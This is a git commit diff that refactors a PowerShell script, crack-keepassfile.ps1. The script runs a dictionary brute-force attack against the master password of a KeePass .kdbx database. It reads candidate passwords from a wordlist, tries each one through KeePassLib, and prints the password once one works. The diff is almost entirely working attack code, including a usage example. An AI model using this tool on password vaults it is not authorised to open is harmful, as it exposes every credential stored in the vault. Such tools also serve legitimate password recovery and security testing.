5167f718f619b721969178b4a608905648a85825
milleniumbug <wojas1222@gmail.com>
2017-07-24 02:18:46 +0200

    Refactoring + final-ish touches

--- crack-keepassfile.ps1
+++ crack-keepassfile.ps1
@@ -12,29 +12,37 @@
     
     This is the path for the KeePass 2.34 files - Typically on a default install will be "c:\program files (x86)\KeePass2x\"
 
-.PARAMETER pwdpath
-    
-    This is the path for the password file to use in the brute force attempt
-
 .PARAMETER targetfile
     
     This is the path for the target kdbx file
 
 
 .NOTES
-  Version:        0.1
-  Author:         Wayne Evans
-  Creation Date:  20/12/2016
-  Purpose/Change: Initial script development
+  Version:            0.2
+  Author:             Wayne Evans, milleniumbug
+  Modification date:  24/07/2017
+  Purpose/Change:     Refactoring + extensions
+
+  Version:            0.1
+  Author:             Wayne Evans
+  Creation Date:      20/12/2016
+  Purpose/Change:     Initial script development
 
   This script is quite slow, but will get the job done - It works at about 500 keys per second currently.  
   
 .EXAMPLE
 
-Get-Content -Encoding UTF8 "c:\software\pwdlist.txt" | crack-keepassfile -binpath "C:\Program Files (x86)\KeePass Password Safe 2" -targetfile "c:\software\posh.kdbx"
+Get-Content -Encoding UTF8 "c:\software\pwdlist.txt" | Crack-KeePassFile -binpath "C:\Program Files (x86)\KeePass Password Safe 2" -targetfile "c:\software\posh.kdbx"
 
   
 #>
+[CmdletBinding()]
+param(
+    [Parameter(Mandatory=$true)]
+    [string]$binpath,
+    [Parameter(Mandatory=$true)]
+    [string]$targetfile
+)
 
 function Load-KeePassBinaries {
     param
@@ -57,41 +65,22 @@ function Load-KeePassBinaries {
     }
 }
 
-function try-key($x)
+function Try-UnlockDatabase($Database, $IOConnectionInfo, $password)
 {
     $Key = New-Object KeePassLib.Keys.CompositeKey
-    $Key.AddUserKey((New-Object KeePassLib.Keys.KcpPassword($x)));
+    $Key.AddUserKey((New-Object KeePassLib.Keys.KcpPassword($password)));
     try
     {
         $Database.Open($IOConnectionInfo,$Key,$null)
-
-        Write-Warning "Master Password Found = $x"
-        $Database.Close()
-        break
+        return $true
     }
-    catch
+    catch [KeePassLib.Keys.InvalidCompositeKeyException]
     {
-
+        return $false
     }
 }
 
-function check-kdbxfile
-{
-    param
-    (
-        [Parameter(Mandatory=$true)]
-        [string]$targetfile
-    )
-    if((Test-Path $targetfile) –eq $false) {
-        Write-Output "The Target File Path: $path is invalid"
-        break
-    }
-    Write-Output "Confirmed Target Path"
-    $IOconnectionInfo.Path = $targetfile
-    return $targetfile
-}
-
-function crack-keepassfile
+function Crack-KeePassFile
 {
     [CmdletBinding()]
     param(
@@ -99,6 +88,7 @@ function crack-keepassfile
         [string]$binpath,
         [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
         [string]$password,
+        [Parameter(Mandatory=$true)]
         [string]$targetfile
     )
     begin
@@ -106,14 +96,18 @@ function crack-keepassfile
         Load-KeePassBinaries -path $binpath
         $Database = New-Object KeePassLib.PwDatabase
         $IOConnectionInfo = New-Object KeePassLib.Serialization.IOConnectionInfo
-        $target=check-kdbxfile -target $targetfile
+        $IOConnectionInfo.Path = $targetfile
         $sw = [Diagnostics.Stopwatch]::StartNew()
         $count = 0
     }
     process
     {
-        try-key($password)
-        if ($count % 1000 -eq 0)
+        if(Try-UnlockDatabase $Database $IOConnectionInfo $password)
+        {
+            Write-Warning "Master Password Found = $password"
+            break
+        }
+        if($count % 1000 -eq 0)
         {
             Write-Output "Number of Keys checked against Database:$count Elapsed Time = $($sw.Elapsed)"
         }
@@ -124,3 +118,5 @@ function crack-keepassfile
         $sw.Stop()
     }
 }
+
+$input | Crack-KeePassFile -binpath $binpath -targetfile $targetfile
